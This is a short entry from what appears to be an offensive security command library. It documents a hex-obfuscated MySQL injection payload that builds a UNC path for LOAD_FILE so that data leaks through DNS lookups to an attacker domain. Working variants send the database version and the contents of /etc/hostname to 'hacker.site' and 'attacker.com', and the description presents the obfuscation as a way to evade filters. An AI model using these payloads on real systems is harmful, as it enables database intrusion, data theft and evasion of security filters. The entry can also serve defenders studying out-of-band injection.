---
type: command
executor: sql
data: >
  select
  load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
tags:
  - sql-injection
  - dns-exfiltration
  - obfuscation
platforms:
  - MySQL
verified: true
validated: true
---

# mysql-load-file-hexadecimal-values

## Command

```sql
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
```

## Description

This obfuscated SQL command uses hexadecimal encoding to build a UNC path for LOAD_FILE, evading filters that block literal strings. It exfiltrates data via DNS queries to an attacker domain, ideal when basic payloads are detected.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `0x5c5c5c5c` | Hex for four backslashes (\\ for UNC) | Yes |
| `version()` | Database version function (replace with hex(data) for exfiltration) | No |
| `0x2e6861636b65722e73697465` | Hex for ".hacker.site" | Yes (customize domain) |
| `0x5c5c612e747874` | Hex for "\\a.txt" | Yes |

## Examples

### Basic Usage

```sql
select load_file(concat(0x5c5c5c5c,@@version,0x2e61747461636b65722e636f6d5c5c74657374));
```

### Advanced Usage

For file exfiltration with hex encoding:

```sql
select load_file(concat(0x5c5c5c5c,unhex(hex(load_file('/etc/hostname'))),0x2e61747461636b65722e636f6d5c5c64));
```
(Use UNHEX/HEX for binary-safe data; chunk if needed.)

## Expected Output

Application: Likely NULL or file load error. DNS logs: Query for subdomain like "5.7.44.hacker.site", confirming exfiltration.

## Related

- [[procedures/MySQL-SQL-Injection-for-Out-of-Band-DNS-Exfiltration]]
- [[commands/mysql-load-file-remote-server-concat]]
